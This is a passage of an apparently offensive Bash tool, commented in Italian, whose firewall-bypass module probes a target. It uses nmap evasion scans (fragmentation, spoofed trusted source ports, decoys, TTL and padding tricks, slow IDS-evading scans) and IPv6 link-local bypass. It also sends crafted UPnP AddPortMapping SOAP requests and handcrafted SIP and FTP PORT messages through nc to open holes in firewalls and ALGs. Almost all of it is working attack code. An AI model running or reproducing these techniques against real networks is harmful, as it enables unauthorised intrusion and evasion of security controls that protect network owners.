        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_fw; exit 1; }
    validate_target "$target"
    check_root
    apply_stealth
    setup_outdir "$target" "fw"
    log "Target: $target | Porte: $ports_str | Output: $OUTDIR"

    # Espandi tech
    local do_ack=0 do_alt=0 do_srcport=0 do_frag=0 do_badsum=0
    local do_ipv6=0 do_upnp=0 do_sip_alg=0
    local do_decoy=0 do_ttl=0 do_datalen=0 do_slowscan=0
    local do_icmp=0 do_ftp_alg=0 do_http_tunnel=0 do_proto_confuse=0
    if [[ "$tech_str" == "all" ]]; then
        do_ack=1; do_alt=1; do_srcport=1; do_frag=1; do_badsum=1
        do_ipv6=1; do_upnp=1; do_sip_alg=1
        do_decoy=1; do_ttl=1; do_datalen=1; do_slowscan=1
        do_icmp=1; do_ftp_alg=1; do_http_tunnel=1; do_proto_confuse=1
    else
        IFS=',' read -ra techs <<< "$tech_str"
        for t in "${techs[@]}"; do
            case "$t" in
                ack)           do_ack=1 ;;
                altscans)      do_alt=1 ;;
                srcport)       do_srcport=1 ;;
                frag)          do_frag=1 ;;
                badsum)        do_badsum=1 ;;
                ipv6)          do_ipv6=1 ;;
                upnp)          do_upnp=1 ;;
                sip-alg)       do_sip_alg=1 ;;
                decoy)         do_decoy=1 ;;
                ttl)           do_ttl=1 ;;
                datalen)       do_datalen=1 ;;
                slowscan)      do_slowscan=1 ;;
                icmp)          do_icmp=1 ;;
                ftp-alg)       do_ftp_alg=1 ;;
                http-tunnel)   do_http_tunnel=1 ;;
                proto-confuse) do_proto_confuse=1 ;;
                *) warn "Tecnica sconosciuta: $t — ignorata" ;;
            esac
        done
    fi

    # Dizionario bypass: porta → tecnica (accumulato durante i test)
    local bypass_log="$OUTDIR/fw_bypass.txt"
    [[ $DRY_RUN -eq 0 ]] && : > "$bypass_log"

    _fw_found() {
        local port="$1" technique="$2"
        found HIGH "FW BYPASS — porta $port raggiungibile via: $technique"
        [[ $DRY_RUN -eq 0 ]] && echo "$port | $technique" >> "$bypass_log" || true
    }

    # ── 0. Baseline SYN scan ────────────────────────────────
    section "Baseline SYN Scan (riferimento)"
    run_cmd "nmap_syn_baseline" \
        "nmap -sS -p $ports_str $NMAP_TIMING \
         -oG \"$OUTDIR\"/fw_baseline.gnmap \
         -oN \"$OUTDIR\"/fw_baseline.nmap \
         $target 2>&1"

    local baseline_filtered="" baseline_open=""
    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_baseline.gnmap" ]]; then
        baseline_filtered=$(_fw_filtered "$OUTDIR/fw_baseline.gnmap")
        baseline_open=$(_fw_open "$OUTDIR/fw_baseline.gnmap")
        local n_filtered; n_filtered=$(echo "$baseline_filtered" | grep -c . 2>/dev/null || echo 0)
        local n_open;     n_open=$(echo "$baseline_open"     | grep -c . 2>/dev/null || echo 0)
        log "Baseline: $n_open open, $n_filtered filtered"
        [[ $n_filtered -eq 0 ]] && warn "Nessuna porta filtered — firewall non rilevato o tutto aperto"
    fi

    # ── 1. ACK scan — stateful vs stateless ─────────────────
    if [[ $do_ack -eq 1 ]]; then
        section "ACK Scan (stateful detection)"
        run_cmd "nmap_ack" \
            "nmap -sA -p $ports_str $NMAP_TIMING \
             -oG \"$OUTDIR\"/fw_ack.gnmap \
             -oN \"$OUTDIR\"/fw_ack.nmap \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_ack.gnmap" ]]; then
            local ack_unfiltered; ack_unfiltered=$(_fw_unfiltered "$OUTDIR/fw_ack.gnmap")
            # Porta filtered in SYN ma unfiltered in ACK → regola stateful DROP (no REJECT)
            # Porta filtered in SYN e filtered in ACK → stateless DROP o blackhole
            # Porta filtered in SYN ma non in ACK list → ACK passa → potenziale bypass
            local fw_type="sconosciuto"
            local n_uf; n_uf=$(echo "$ack_unfiltered" | grep -c . 2>/dev/null || echo 0)
            if [[ $n_uf -gt 0 ]]; then
                fw_type="STATEFUL (iptables -m state DROP)"
                found MEDIUM "FW — Tipo rilevato: $fw_type ($n_uf porte unfiltered all'ACK)"
            else
                local ack_filtered; ack_filtered=$(_fw_filtered "$OUTDIR/fw_ack.gnmap")
                local n_af; n_af=$(echo "$ack_filtered" | grep -c . 2>/dev/null || echo 0)
                [[ $n_af -gt 0 ]] && fw_type="STATELESS o blackhole (ACK anch'esso bloccato)"
                found INFO "FW — Tipo rilevato: $fw_type"
            fi
            echo "Tipo FW: $fw_type" >> "$OUTDIR/fw_summary.txt"
            # Porte che ACK bypassa (filtered→unfiltered): non utili per TCP ma info su rule type
            while IFS= read -r p; do
                [[ -z "$p" ]] && continue
                _fw_in_list "$p" "$baseline_filtered" && \
                    log "  Porta $p: filtered in SYN, unfiltered in ACK → regola stateful"
            done <<< "$ack_unfiltered" || true
        fi
    fi

    # ── 2. Scan alternativi FIN/NULL/XMAS/Window ────────────
    if [[ $do_alt -eq 1 ]]; then
        section "Scan Alternativi (FIN / NULL / XMAS / Window)"
        for scan_type in F N X W; do
            local scan_name
            case "$scan_type" in
                F) scan_name="FIN"    ;;
                N) scan_name="NULL"   ;;
                X) scan_name="XMAS"   ;;
                W) scan_name="Window" ;;
            esac
            run_cmd "nmap_${scan_name}" \
                "nmap -s${scan_type} -p $ports_str $NMAP_TIMING \
                 -oG \"$OUTDIR\"/fw_${scan_name}.gnmap \
                 -oN \"$OUTDIR\"/fw_${scan_name}.nmap \
                 $target 2>&1"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_${scan_name}.gnmap" ]]; then
                # Porte che mostrano 'open' o 'open|filtered' con questa tecnica
                # mentre erano 'filtered' nel baseline
                local alt_open; alt_open=$(_fw_open "$OUTDIR/fw_${scan_name}.gnmap")
                while IFS= read -r p; do
                    [[ -z "$p" ]] && continue
                    if _fw_in_list "$p" "$baseline_filtered"; then
                        _fw_found "$p" "$scan_name scan"
                    fi
                done <<< "$alt_open" || true
            fi
        done
    fi

    # ── 3. Bad checksum — firewall vs IDS ───────────────────
    if [[ $do_badsum -eq 1 ]]; then
        section "Bad Checksum (rilevamento firewall vs IDS)"
        run_cmd "nmap_badsum" \
            "nmap --badsum -p $ports_str $NMAP_TIMING \
             -oG \"$OUTDIR\"/fw_badsum.gnmap \
             -oN \"$OUTDIR\"/fw_badsum.nmap \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_badsum.gnmap" ]]; then
            local bs_open; bs_open=$(_fw_open "$OUTDIR/fw_badsum.gnmap")
            local n_bs; n_bs=$(echo "$bs_open" | grep -c . 2>/dev/null || echo 0)
            if [[ $n_bs -gt 0 ]]; then
                found MEDIUM "FW — Bad checksum: $n_bs porte rispondono → possibile IDS senza stateful inspection"
                echo "BadChecksum open: $bs_open" >> "$OUTDIR/fw_summary.txt"
            else
                log "Bad checksum: nessuna risposta → firewall scarta pacchetti malformati (corretto)"
            fi
        fi
    fi

    # ── 4. Source port spoofing ──────────────────────────────
    if [[ $do_srcport -eq 1 ]]; then
        section "Source Port Spoofing (porte trusted comuni)"
        # Porte che molti embedded firewall si fidano come sorgente
        local trusted_src_ports=(53 20 21 80 443 123 67 68 554 179 500 1194 8291 3389 5060)
        for src in "${trusted_src_ports[@]}"; do
            run_cmd "nmap_srcport_${src}" \
                "nmap -sS -p $ports_str --source-port $src $NMAP_TIMING \
                 -oG \"$OUTDIR\"/fw_srcport_${src}.gnmap \
                 $target 2>&1"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_srcport_${src}.gnmap" ]]; then
                local sp_open; sp_open=$(_fw_open "$OUTDIR/fw_srcport_${src}.gnmap")
                while IFS= read -r p; do
                    [[ -z "$p" ]] && continue
                    # Nuovo rispetto al baseline? (era filtered, ora open)
                    if _fw_in_list "$p" "$baseline_filtered"; then
                        _fw_found "$p" "source-port $src spoofing"
                        found CRITICAL "FW — Regola 'trusted src port' rilevata: traffico da porta $src passa senza filtro"
                    fi
                done <<< "$sp_open" || true
            fi
        done
    fi

    # ── 5. IP Fragmentation ──────────────────────────────────
    if [[ $do_frag -eq 1 ]]; then
        section "IP Fragmentation Bypass"
        for frag_opt in "-f" "--mtu 8" "--mtu 24"; do
            local frag_tag; frag_tag=$(echo "$frag_opt" | tr ' ' '_' | tr -d '-')
            run_cmd "nmap_frag_${frag_tag}" \
                "nmap -sS -p $ports_str $frag_opt $NMAP_TIMING \
                 -oG \"$OUTDIR\"/fw_frag_${frag_tag}.gnmap \
                 $target 2>&1"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_frag_${frag_tag}.gnmap" ]]; then
                local fr_open; fr_open=$(_fw_open "$OUTDIR/fw_frag_${frag_tag}.gnmap")
                while IFS= read -r p; do
                    [[ -z "$p" ]] && continue
                    if _fw_in_list "$p" "$baseline_filtered"; then
                        _fw_found "$p" "IP fragmentation ($frag_opt)"
                    fi
                done <<< "$fr_open" || true
            fi
        done
    fi

    # ── 6. IPv6 bypass ──────────────────────────────────────
    if [[ $do_ipv6 -eq 1 ]]; then
        section "IPv6 Link-Local Bypass"
        local iface; iface=$(ip route get "$target" 2>/dev/null | awk '/dev/{print $5; exit}' || echo eth0)
        # Recupera MAC del target da ARP
        local target_mac=""
        if [[ $DRY_RUN -eq 0 ]]; then
            # Assicura entry ARP (ping rapido)
            ping -c 1 -W 1 "$target" &>/dev/null || true
            target_mac=$(arp -n "$target" 2>/dev/null | awk '/([0-9a-f]{2}:){5}[0-9a-f]{2}/{print $3}' | head -1 || true)
        fi
        if [[ -n "$target_mac" ]]; then
            local link_local; link_local=$(_mac_to_link_local "$target_mac")
            local ipv6_scope="${link_local}%${iface}"
            log "IPv6 link-local derivato: $ipv6_scope (MAC: $target_mac)"
            echo "IPv6: $ipv6_scope" >> "$OUTDIR/fw_summary.txt"
            run_cmd "nmap_ipv6" \
                "nmap -6 -sV -p $ports_str $NMAP_TIMING \
                 -oG \"$OUTDIR\"/fw_ipv6.gnmap \
                 -oN \"$OUTDIR\"/fw_ipv6.nmap \
                 '$ipv6_scope' 2>&1"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_ipv6.gnmap" ]]; then
                local v6_open; v6_open=$(_fw_open "$OUTDIR/fw_ipv6.gnmap")
                while IFS= read -r p; do
                    [[ -z "$p" ]] && continue
                    if _fw_in_list "$p" "$baseline_filtered"; then
                        _fw_found "$p" "IPv6 link-local ($ipv6_scope)"
                        found CRITICAL "FW — Porta $p bloccata su IPv4 ma APERTA su IPv6: nessuna regola IPv6"
                    elif ! _fw_in_list "$p" "$baseline_open"; then
                        found HIGH "FW — Porta $p aperta solo su IPv6 (non visibile su IPv4)"
                    fi
                done <<< "$v6_open" || true
            fi
        elif [[ $DRY_RUN -eq 0 ]]; then
            warn "MAC non ottenuto da ARP — IPv6 link-local non derivabile (target off-link?)"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} IPv6 link-local bypass test su $target"
        fi
        # Prova anche indirizzo IPv6 globale via DNS AAAA
        if [[ $DRY_RUN -eq 0 ]] && command -v dig &>/dev/null; then
            local target_aaaa=""
            target_aaaa=$(dig +short AAAA "$target" 2>/dev/null | grep -v '^;' | head -1 || true)
            if [[ -n "$target_aaaa" ]]; then
                log "IPv6 globale trovato via DNS AAAA: $target_aaaa"
                echo "IPv6 globale: $target_aaaa" >> "$OUTDIR/fw_summary.txt"
                run_cmd "nmap_ipv6_global" \
                    "nmap -6 -sV -p $ports_str $NMAP_TIMING \
                     -oG \"$OUTDIR\"/fw_ipv6_global.gnmap \
                     -oN \"$OUTDIR\"/fw_ipv6_global.nmap \
                     '$target_aaaa' 2>&1"
                if [[ -f "$OUTDIR/fw_ipv6_global.gnmap" ]]; then
                    local v6g_open; v6g_open=$(_fw_open "$OUTDIR/fw_ipv6_global.gnmap")
                    while IFS= read -r p; do
                        [[ -z "$p" ]] && continue
                        if _fw_in_list "$p" "$baseline_filtered"; then
                            _fw_found "$p" "IPv6 globale ($target_aaaa)"
                            found CRITICAL "FW — Porta $p bloccata su IPv4 ma APERTA su IPv6 globale"
                        fi
                    done <<< "$v6g_open" || true
                fi
            fi
        fi
    fi

    # ── 7. UPnP AddPortMapping punch-through ────────────────
    if [[ $do_upnp -eq 1 ]]; then
        section "UPnP Firewall Punch-Through (AddPortMapping)"
        # Auto-detect porta UPnP
        local upnp_ctrl_url="" upnp_detected_port="${upnp_port:-}"
        if [[ -z "$upnp_detected_port" && $DRY_RUN -eq 0 ]]; then
            for p in 2869 5000 8080 49152 1900; do
                check_port "$target" "$p" || continue
                for path in "/upnp/description.xml" "/rootDesc.xml" "/description.xml" "/gatedesc.xml"; do
                    local resp
                    resp=$(curl -s --max-time 5 "http://${target}:${p}${path}" 2>/dev/null || true)
                    if echo "$resp" | grep -qi "WANIPConnection\|WANPPPConnection\|deviceType"; then
                        upnp_detected_port="$p"
                        # Cerca control URL nel XML
                        upnp_ctrl_url=$(echo "$resp" | \
                            grep -oP '(?<=<controlURL>)[^<]+' 2>/dev/null | \
                            grep -i "WANIPConnection\|WANPPPConn" | head -1 || true)
                        [[ -z "$upnp_ctrl_url" ]] && upnp_ctrl_url="/upnp/control/WANIPConnection1"
                        log "UPnP trovato: $target:$upnp_detected_port$upnp_ctrl_url"
                        break 2
                    fi
                done
            done
        fi
        [[ -z "$upnp_ctrl_url" ]] && upnp_ctrl_url="/upnp/control/WANIPConnection1"

        if [[ -n "$upnp_detected_port" || $DRY_RUN -eq 1 ]]; then
            local our_ip
            our_ip=$(ip route get "$target" 2>/dev/null | awk '/src/{print $7; exit}' || echo "127.0.0.1")
            local p="${upnp_detected_port:-2869}"
            local soap_body
            soap_body="<?xml version=\"1.0\"?>"
            soap_body+="<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\""
            soap_body+=" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
            soap_body+="<s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
            soap_body+="<NewRemoteHost></NewRemoteHost>"
            soap_body+="<NewExternalPort>${probe_port}</NewExternalPort>"
            soap_body+="<NewProtocol>TCP</NewProtocol>"
            soap_body+="<NewInternalPort>${probe_port}</NewInternalPort>"
            soap_body+="<NewInternalClient>${our_ip}</NewInternalClient>"
            soap_body+="<NewEnabled>1</NewEnabled>"
            soap_body+="<NewPortMappingDescription>EXA-DUNE-PROBE</NewPortMappingDescription>"
            soap_body+="<NewLeaseDuration>120</NewLeaseDuration>"
            soap_body+="</u:AddPortMapping></s:Body></s:Envelope>"
            run_cmd "upnp_addmap" \
                "curl -s --max-time 10 -X POST 'http://${target}:${p}${upnp_ctrl_url}' \
                 -H 'Content-Type: text/xml; charset=\"utf-8\"' \
                 -H 'SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"' \
                 -d '${soap_body}' 2>&1 | tee \"$OUTDIR\"/upnp_addmap.txt"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/upnp_addmap.txt" ]]; then
                if grep -qi "AddPortMappingResponse\|errorCode\|200 OK" "$OUTDIR/upnp_addmap.txt" 2>/dev/null; then
                    if ! grep -qi "errorCode\|501\|401\|403" "$OUTDIR/upnp_addmap.txt" 2>/dev/null; then
                        found CRITICAL "FW — UPnP AddPortMapping RIUSCITO: porta $probe_port aperta nel firewall"
                        _fw_found "$probe_port" "UPnP AddPortMapping"
                        sleep 2
                        check_port "$target" "$probe_port" && \
                            found CRITICAL "FW — Porta $probe_port confermata APERTA dopo UPnP punch-through" || true
                    else
                        local err_code; err_code=$(grep -oP '(?<=<errorCode>)[^<]+' "$OUTDIR/upnp_addmap.txt" 2>/dev/null | head -1 || true)
                        log "UPnP AddPortMapping rifiutato (errorCode: ${err_code:-unknown}) — provo WANPPPConnection"
                        # Fallback WANPPPConnection (PPPoE gateway)
                        local ppp_ctrl="/upnp/control/WANPPPConnection1"
                        local ppp_body
                        ppp_body="${soap_body/WANIPConnection:1/WANPPPConnection:1}"
                        ppp_body="${ppp_body/WANIPConnection1/WANPPPConnection1}"
                        run_cmd "upnp_ppp_addmap" \
                            "curl -s --max-time 10 -X POST 'http://${target}:${p}${ppp_ctrl}' \
                             -H 'Content-Type: text/xml; charset=\"utf-8\"' \
                             -H 'SOAPAction: \"urn:schemas-upnp-org:service:WANPPPConnection:1#AddPortMapping\"' \
                             -d '${ppp_body}' 2>&1 | tee \"$OUTDIR\"/upnp_ppp_addmap.txt"
                        if [[ -f "$OUTDIR/upnp_ppp_addmap.txt" ]] && \
                           grep -qi "AddPortMappingResponse" "$OUTDIR/upnp_ppp_addmap.txt" 2>/dev/null && \
                           ! grep -qi "errorCode" "$OUTDIR/upnp_ppp_addmap.txt" 2>/dev/null; then
                            found CRITICAL "FW — UPnP WANPPPConnection AddPortMapping RIUSCITO: porta $probe_port aperta"
                            _fw_found "$probe_port" "UPnP WANPPPConnection AddPortMapping"
                        fi
                    fi
                fi
            fi
            # DeletePortMapping cleanup (non fallire se non riesce)
            local del_body
            del_body="<?xml version=\"1.0\"?>"
            del_body+="<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
            del_body+="<s:Body><u:DeletePortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
            del_body+="<NewRemoteHost></NewRemoteHost>"
            del_body+="<NewExternalPort>${probe_port}</NewExternalPort>"
            del_body+="<NewProtocol>TCP</NewProtocol>"
            del_body+="</u:DeletePortMapping></s:Body></s:Envelope>"
            [[ $DRY_RUN -eq 0 ]] && curl -s --max-time 5 -X POST \
                "http://${target}:${p}${upnp_ctrl_url}" \
                -H 'Content-Type: text/xml; charset="utf-8"' \
                -H 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"' \
                -d "$del_body" &>/dev/null || true
        else
            warn "UPnP non trovato su $target — punch-through saltato"
        fi
    fi

    # ── 8. SIP ALG pinhole exploitation ─────────────────────
    if [[ $do_sip_alg -eq 1 ]]; then
        section "SIP ALG Pinhole Exploitation"
        if [[ $DRY_RUN -eq 0 ]]; then
            check_port "$target" "$sip_port" || { warn "Porta SIP $sip_port chiusa — ALG test saltato"; }
            if check_port "$target" "$sip_port"; then
                local our_ip
                our_ip=$(ip route get "$target" 2>/dev/null | awk '/src/{print $7; exit}' || echo "127.0.0.1")
                local call_id="alg-$(date +%s)-exa"
                # Build SDP con il probe_port come porta RTP
                local sdp_body
                sdp_body="v=0\r\n"
                sdp_body+="o=exa-dune 1234 1234 IN IP4 ${our_ip}\r\n"
                sdp_body+="s=FW-Probe\r\n"
                sdp_body+="c=IN IP4 ${our_ip}\r\n"
                sdp_body+="t=0 0\r\n"
                sdp_body+="m=audio ${probe_port} RTP/AVP 0\r\n"
                sdp_body+="a=rtpmap:0 PCMU/8000\r\n"
                local sdp_len; sdp_len=$(printf '%b' "$sdp_body" | wc -c)
                # Build INVITE
                local invite
                invite="INVITE sip:100@${target} SIP/2.0\r\n"
                invite+="Via: SIP/2.0/UDP ${our_ip}:5060;branch=z9hG4bK-${call_id}\r\n"
                invite+="Max-Forwards: 70\r\n"
                invite+="From: <sip:probe@${our_ip}>;tag=${call_id}\r\n"
                invite+="To: <sip:100@${target}>\r\n"
                invite+="Call-ID: ${call_id}@${our_ip}\r\n"
                invite+="CSeq: 1 INVITE\r\n"
                invite+="Contact: <sip:probe@${our_ip}:5060>\r\n"
                invite+="Content-Type: application/sdp\r\n"
                invite+="Content-Length: ${sdp_len}\r\n"
                invite+="\r\n${sdp_body}"
                log "Invio SIP INVITE con SDP port=$probe_port verso $target:$sip_port ..."
                printf '%b' "$invite" | nc -u -w 3 "$target" "$sip_port" \
                    > "$OUTDIR/sip_alg_invite.txt" 2>&1 || true
                # Attendi che l'ALG crei il pinhole
                sleep 2
                # Verifica se probe_port è ora raggiungibile
                if check_port "$target" "$probe_port"; then
                    _fw_found "$probe_port" "SIP ALG pinhole INVITE (SDP port $probe_port)"
                    found CRITICAL "FW — SIP ALG INVITE ha aperto il pinhole: porta $probe_port RAGGIUNGIBILE"
                else
                    log "Porta $probe_port non aperta dopo INVITE — provo REGISTER..."
                fi
                # REGISTER: alcuni ALG creano pinhole anche su REGISTER
                local reg_msg
                reg_msg="REGISTER sip:${target} SIP/2.0\r\n"
                reg_msg+="Via: SIP/2.0/UDP ${our_ip}:5060;branch=z9hG4bK-reg-${call_id}\r\n"
                reg_msg+="Max-Forwards: 70\r\n"
                reg_msg+="From: <sip:probe@${our_ip}>;tag=reg-${call_id}\r\n"
                reg_msg+="To: <sip:probe@${our_ip}>\r\n"
                reg_msg+="Call-ID: reg-${call_id}@${our_ip}\r\n"
                reg_msg+="CSeq: 1 REGISTER\r\n"
                reg_msg+="Contact: <sip:probe@${our_ip}:${probe_port}>\r\n"
                reg_msg+="Expires: 120\r\n"
                reg_msg+="Content-Length: 0\r\n\r\n"
                printf '%b' "$reg_msg" | nc -u -w 3 "$target" "$sip_port" \
                    > "$OUTDIR/sip_alg_register.txt" 2>&1 || true
                sleep 2
                if check_port "$target" "$probe_port"; then
                    _fw_found "$probe_port" "SIP ALG pinhole REGISTER (Contact port $probe_port)"
                    found CRITICAL "FW — SIP ALG REGISTER ha aperto il pinhole: porta $probe_port RAGGIUNGIBILE"
                fi
                # OPTIONS: probe passivo, non crea sessioni ma testa il path SIP
                local opt_msg
                opt_msg="OPTIONS sip:${target} SIP/2.0\r\n"
                opt_msg+="Via: SIP/2.0/UDP ${our_ip}:5060;branch=z9hG4bK-opt-${call_id}\r\n"
                opt_msg+="Max-Forwards: 70\r\n"
                opt_msg+="From: <sip:probe@${our_ip}>;tag=opt-${call_id}\r\n"
                opt_msg+="To: <sip:${target}>\r\n"
                opt_msg+="Call-ID: opt-${call_id}@${our_ip}\r\n"
                opt_msg+="CSeq: 1 OPTIONS\r\n"
                opt_msg+="Content-Length: 0\r\n\r\n"
                printf '%b' "$opt_msg" | nc -u -w 3 "$target" "$sip_port" \
                    > "$OUTDIR/sip_alg_options.txt" 2>&1 || true
                if [[ -s "$OUTDIR/sip_alg_options.txt" ]]; then
                    local sip_opt_resp
                    sip_opt_resp=$(head -1 "$OUTDIR/sip_alg_options.txt" || true)
                    log "SIP OPTIONS risposta: $sip_opt_resp"
                    echo "SIP OPTIONS: $sip_opt_resp" >> "$OUTDIR/fw_summary.txt"
                fi
                # Log risposta INVITE
                if [[ -s "$OUTDIR/sip_alg_invite.txt" ]]; then
                    local sip_resp
                    sip_resp=$(head -1 "$OUTDIR/sip_alg_invite.txt" || true)
                    log "Risposta SIP INVITE: $sip_resp"
                    echo "SIP INVITE response: $sip_resp" >> "$OUTDIR/fw_summary.txt"
                fi
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} SIP ALG pinhole test: INVITE SDP port=$probe_port → $target:$sip_port"
        fi
    fi

    # ── 9. Decoy scan ────────────────────────────────────────
    if [[ $do_decoy -eq 1 ]]; then
        section "Decoy Scan (-D RND:10)"
        run_cmd "nmap_decoy" \
            "nmap -sS -p $ports_str -D RND:10 $NMAP_TIMING \
             -oG \"$OUTDIR\"/fw_decoy.gnmap \
             -oN \"$OUTDIR\"/fw_decoy.nmap \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_decoy.gnmap" ]]; then
            local dec_open; dec_open=$(_fw_open "$OUTDIR/fw_decoy.gnmap")
            while IFS= read -r p; do
                [[ -z "$p" ]] && continue
                if _fw_in_list "$p" "$baseline_filtered"; then
                    _fw_found "$p" "decoy scan (RND:10)"
                fi
            done <<< "$dec_open" || true
            local dec_n; dec_n=$(echo "$dec_open" | grep -c . 2>/dev/null || echo 0)
            [[ $dec_n -gt 0 ]] && found MEDIUM "FW — Decoy scan: $dec_n porte rispondono (IDS distrazione possibile)"
        fi
    fi

    # ── 10. TTL manipulation ──────────────────────────────────
    if [[ $do_ttl -eq 1 ]]; then
        section "TTL Manipulation"
        for ttl_val in 64 128 255; do
            run_cmd "nmap_ttl_${ttl_val}" \
                "nmap -sS -p $ports_str --ttl $ttl_val $NMAP_TIMING \
                 -oG \"$OUTDIR\"/fw_ttl_${ttl_val}.gnmap \
                 $target 2>&1"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_ttl_${ttl_val}.gnmap" ]]; then
                local ttl_open; ttl_open=$(_fw_open "$OUTDIR/fw_ttl_${ttl_val}.gnmap")
                while IFS= read -r p; do
                    [[ -z "$p" ]] && continue
                    if _fw_in_list "$p" "$baseline_filtered"; then
                        _fw_found "$p" "TTL=$ttl_val spoofing"
                        found HIGH "FW — TTL=$ttl_val ha bypassato il filtro su porta $p"
                    fi
                done <<< "$ttl_open" || true
            fi
        done
    fi

    # ── 11. Data-length padding ───────────────────────────────
    if [[ $do_datalen -eq 1 ]]; then
        section "Data-Length Padding"
        for dlen in 16 32 64 200; do
            run_cmd "nmap_datalen_${dlen}" \
                "nmap -sS -p $ports_str --data-length $dlen $NMAP_TIMING \
                 -oG \"$OUTDIR\"/fw_datalen_${dlen}.gnmap \
                 $target 2>&1"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_datalen_${dlen}.gnmap" ]]; then
                local dl_open; dl_open=$(_fw_open "$OUTDIR/fw_datalen_${dlen}.gnmap")
                while IFS= read -r p; do
                    [[ -z "$p" ]] && continue
                    if _fw_in_list "$p" "$baseline_filtered"; then
                        _fw_found "$p" "data-length padding ($dlen byte)"
                        found HIGH "FW — Padding $dlen byte ha bypassato il filtro su porta $p"
                    fi
                done <<< "$dl_open" || true
            fi
        done
    fi

    # ── 12. Rate evasion (slow scan) ─────────────────────────
    if [[ $do_slowscan -eq 1 ]]; then
        section "Rate Evasion (slow scan -T1 --scan-delay)"
        log "Rate evasion scan (lento — può durare minuti)..."
        run_cmd "nmap_slowscan" \
            "nmap -sS -p $ports_str -T1 --scan-delay 2s \
             -oG \"$OUTDIR\"/fw_slowscan.gnmap \
             -oN \"$OUTDIR\"/fw_slowscan.nmap \
             $target 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_slowscan.gnmap" ]]; then
            local slow_open; slow_open=$(_fw_open "$OUTDIR/fw_slowscan.gnmap")
            while IFS= read -r p; do
                [[ -z "$p" ]] && continue
                if _fw_in_list "$p" "$baseline_filtered"; then
                    _fw_found "$p" "rate evasion T1 (IDS rate-limit bypass)"
                    found HIGH "FW — Slow scan ha bypassato il filtro su porta $p (IDS rate-based?)"
                fi
            done <<< "$slow_open" || true
        fi
    fi

    # ── 13. ICMP type 13/17 ───────────────────────────────────
    if [[ $do_icmp -eq 1 ]]; then
        section "ICMP Recon (tipo 13 Timestamp, tipo 17 Netmask)"
        if [[ $DRY_RUN -eq 0 ]]; then
            for icmp_type in 13 17; do
                local icmp_name; icmp_name=$([[ $icmp_type -eq 13 ]] && echo "Timestamp" || echo "Netmask")
                log "ICMP tipo $icmp_type ($icmp_name) verso $target..."
                local icmp_resp=""
                icmp_resp=$(nmap -sn --script icmp-ms-ping --packet-trace \
                    -oN "$OUTDIR/fw_icmp_${icmp_type}.nmap" "$target" 2>/dev/null || true)
                # Alternativa diretta con nping se disponibile
                if command -v nping &>/dev/null; then
                    nping --icmp --icmp-type "$icmp_type" -c 2 "$target" \
                        > "$OUTDIR/fw_icmp_nping_${icmp_type}.txt" 2>&1 || true
                    if grep -qi "RCVD\|Recv" "$OUTDIR/fw_icmp_nping_${icmp_type}.txt" 2>/dev/null; then
                        found MEDIUM "FW — ICMP tipo $icmp_type ($icmp_name) risponde → filtro ICMP incompleto"
                        echo "ICMP tipo $icmp_type: risponde" >> "$OUTDIR/fw_summary.txt"
                    else
                        log "ICMP tipo $icmp_type ($icmp_name): nessuna risposta (filtrato)"
                    fi
                else
                    warn "nping non trovato — ICMP tipo $icmp_type saltato (installa nmap-nping)"
                fi
            done
        else
            echo -e "${CYAN}[DRY-RUN]${NC} ICMP tipo 13/17 probe → $target"
        fi
    fi

    # ── 14. FTP ALG PORT command pinhole ─────────────────────
    if [[ $do_ftp_alg -eq 1 ]]; then
        section "FTP ALG Pinhole (PORT command)"
        if [[ $DRY_RUN -eq 0 ]]; then
            check_port "$target" 21 || { warn "FTP porta 21 chiusa — FTP ALG saltato"; }
            if check_port "$target" 21; then
                local our_ip
                our_ip=$(ip route get "$target" 2>/dev/null | awk '/src/{print $7; exit}' || echo "127.0.0.1")
                # Converti IP in formato FTP (a,b,c,d)
                local ip_ftp; ip_ftp="${our_ip//./ }"; ip_ftp="${ip_ftp// /,}"
                # probe_port high byte + low byte
                local ph=$(( probe_port / 256 ))
                local pl=$(( probe_port % 256 ))
                local ftp_alg_port="${ip_ftp},${ph},${pl}"
                log "FTP PORT command: porta $probe_port verso $target:21 (FTP ALG test)..."
                {
                    # Connetti in modo anonimo o con creds generiche
                    printf 'USER anonymous\r\n'
                    sleep 1
                    printf 'PASS probe@exa-dune.test\r\n'
                    sleep 1
                    # Invia PORT command con il nostro IP e probe_port
                    printf 'PORT %s\r\n' "$ftp_alg_port"
                    sleep 2
                    printf 'QUIT\r\n'
                } | nc -w 8 "$target" 21 > "$OUTDIR/ftp_alg.txt" 2>&1 || true
                sleep 2
                if [[ -s "$OUTDIR/ftp_alg.txt" ]]; then
                    local ftp_code; ftp_code=$(grep "200\|PORT" "$OUTDIR/ftp_alg.txt" | head -1 || true)
                    log "FTP risposta: $ftp_code"
                    if grep -q "^200" "$OUTDIR/ftp_alg.txt" 2>/dev/null; then
                        found HIGH "FW — FTP PORT accettato: ALG potrebbe aver aperto pinhole su porta $probe_port"
                        # Verifica pinhole
                        check_port "$target" "$probe_port" && \
                            { _fw_found "$probe_port" "FTP ALG PORT command"; \
